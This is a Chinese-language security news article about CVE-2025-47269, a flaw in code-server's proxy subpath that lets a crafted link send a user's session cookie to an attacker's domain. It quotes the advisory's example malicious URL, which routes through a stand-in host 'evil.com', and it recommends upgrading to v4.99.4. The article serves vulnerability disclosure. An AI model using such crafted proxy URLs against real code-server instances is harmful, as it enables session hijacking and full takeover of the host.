---
title: 浏览器中的 VS Code 存在风险：code-server 安全警报
url: https://www.anquanke.com/post/id/307293
source: 安全客-有思想的安全新媒体
date: 2025-05-13
fetch_date: 2025-10-06T22:23:27.098328
---

# 浏览器中的 VS Code 存在风险：code-server 安全警报

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# 浏览器中的 VS Code 存在风险：code-server 安全警报

阅读量**155140**

发布时间 : 2025-05-12 14:12:30

**x**

##### 译文声明

本文是翻译文章，文章原作者 Ddos，文章来源：securityonline

原文地址：<https://securityonline.info/vs-code-in-the-browser-at-risk-code-server-security-alert/>

译文仅供参考，具体内容表达以及含义原文为准。

![代码服务器、VS Code、安全]()

最新披露的安全公告揭示了广受欢迎的代码服务器项目中的一个漏洞，该项目允许用户在浏览器中运行 VS Code。该漏洞编号为 CVE-2025-47269，CVSS 评分为 8.3，可能允许攻击者未经授权访问用户会话。

code-server 是一个备受推崇的项目，在 GitHub 上拥有超过 71,000 个 star，它让开发者能够灵活地在任何机器上运行 VS Code，并通过 Web 浏览器访问。然而，这种便捷性也伴随着安全方面的考虑。

核心问题在于`proxy`代码服务器的子路径功能。正如安全公告所解释的那样，“*使用子路径恶意构建的 URL`proxy`可能导致攻击者获得会话令牌的访问权限*。”

该漏洞源于对代理请求端口缺乏适当的验证。此漏洞允许攻击者操纵 URL，从而导致代码服务器将连接代理到任意域名。

该公告提供了一个清晰的示例：“*恶意 URL`https://<code-server>/proxy/test@evil.com/path`将被代理到`test@evil.com/path`攻击者可以窃取用户会话令牌的地方*。”

本质上，虽然代理功能旨在访问本地端口，但攻击者可以构造一个 URL，将代理重定向到他们自己的恶意服务器。当用户点击此类链接时，他们的会话 Cookie 会被无意中发送到攻击者的服务器。安全公告指出：“*通常情况下，这用于代理本地端口，但 URL 可以指向攻击者的域名，然后将连接代理到该域名，这将包括发送 Cookie*。”

该漏洞的后果非常严重。通过获取用户的会话cookie，攻击者可以有效绕过身份验证，并完全控制代码服务器实例。

正如该公告所强调的，“*通过访问会话 cookie，攻击者可以登录代码服务器，并以运行代码服务器的用户身份完全访问托管代码服务器的计算机*。”这意味着攻击者可能会读取、修改或删除文件，安装恶意软件或在服务器上执行其他恶意操作。

幸运的是，目前已有补丁可以修复此漏洞。强烈建议 code-server 用户尽快更新至最新版本（v 4.99.4或更高版本），以防范此严重安全风险。

本文翻译自securityonline [原文链接](https://securityonline.info/vs-code-in-the-browser-at-risk-code-server-security-alert/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由**安全客**原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处： [https://www.anquanke.com/post/id/307293](/post/id/307293)

安全KER - 有思想的安全新媒体

本文转载自: [securityonline](https://securityonline.info/vs-code-in-the-browser-at-risk-code-server-security-alert/)

如若转载,请注明出处： <https://securityonline.info/vs-code-in-the-browser-at-risk-code-server-security-alert/>

安全KER - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

* [安全资讯](/tag/%E5%AE%89%E5%85%A8%E8%B5%84%E8%AE%AF)
* [漏洞情报](/tag/%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5)

**+1**2赞

收藏

![](https://p3.ssl.qhimg.com/t010857340ce46bb672.jpg)安全客

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

## 发表评论

您还未登录，请先登录。

[登录](/login/index.html)

![](https://p0.ssl.qhimg.com/t014757b72460d855bf.png)

[![](https://p3.ssl.qhimg.com/t010857340ce46bb672.jpg)](/member.html?memberId=170061)

[安全客](/member.html?memberId=170061)

这个人太懒了，签名都懒得写一个

* 文章
* **2096**

* 粉丝
* **6**

### TA的文章

* ##### [英国通过数据访问和使用监管法案](/post/id/308719)

  2025-06-20 17:11:10
* ##### [CISA警告：严重缺陷（CVE-2025-5310）暴露加油站设备](/post/id/308715)

  2025-06-20 17:09:03
* ##### [大多数公司高估了AI治理，因为隐私风险激增](/post/id/308708)

  2025-06-20 17:05:02
* ##### [研究人员发现了有史以来最大的数据泄露事件，暴露了160亿个登录凭证](/post/id/308704)

  2025-06-20 17:02:15
* ##### [CVE-2025-6018和CVE-2025-6019漏洞利用：链接本地特权升级缺陷让攻击者获得大多数Linux发行版的根访问权限](/post/id/308701)

  2025-06-20 16:59:36

### 相关文章

* ##### [国庆重保+攻防演练大考在即！360大模型安全服务专项方案筑牢AI防线](/post/id/312460)

  2025-09-29 18:06:17
* ##### [Apache Airflow 存在权限漏洞，可导致只读用户获取敏感信息](/post/id/312457)

  2025-09-29 18:05:56
* ##### [Meta 旨在打造机器人领域的“Android”，为下一代人形AI提供通用平台](/post/id/312454)

  2025-09-29 18:05:34
* ##### [Formbricks 存在高危漏洞 (CVE-2025-59934)，攻击者可通过伪造JWT令牌导致未授权的密码重置](/post/id/312451)

  2025-09-29 18:05:05
* ##### [Notepad++ 中存在DLL劫持漏洞（CVE-2025-56383），可导致任意代码执行，且POC已公开](/post/id/312448)

  2025-09-29 18:04:33
* ##### [Morte僵尸网络被披露：正利用路由器与企业应用漏洞，迅速扩张其“加载器即服务”活动](/post/id/312444)

  2025-09-29 18:04:01
* ##### [Akira勒索软件利用SonicWall VPN账户发起急速入侵](/post/id/312438)

  2025-09-29 18:03:28

### 热门推荐

文章目录

![](https://p0.qhimg.com/t11098f6bcd5614af4bf21ef9b5.png)

安全KER

* [关于我们](/about)
* [联系我们](/note/contact)
* [用户协议](/note/protocol)
* [隐私协议](/note/privacy)

商务合作

* [合作内容](/note/business)
* [联系方式](/note/contact)
* [友情链接](/link)

内容需知

* [投稿须知](https://www.anquanke.com/contribute/tips)
* [转载须知](/note/repost)
* 官网QQ群：568681302

合作单位

* [![安全KER](https://p0.ssl.qhimg.com/t01592a959354157bc0.png)](http://www.cert.org.cn/)
* [![安全KER](https://p0.ssl.qhimg.com/t014f76fcea94035e47.png)](http://www.cnnvd.org.cn/)

Copyright © 北京奇虎科技有限公司 三六零数字安全科技集团有限公司 安全KER All Rights Reserved [京ICP备08010314号-66](https://beian.miit.gov.cn/)[![](https://icon.cnzz.com/img/pic.gif)](https://www.cnzz.com/stat/website.php?web_id=1271278035 "站长统计")

微信二维码

**X**![安全KER](https://p0.ssl.qhimg.com/t0151209205b47f2270.jpg)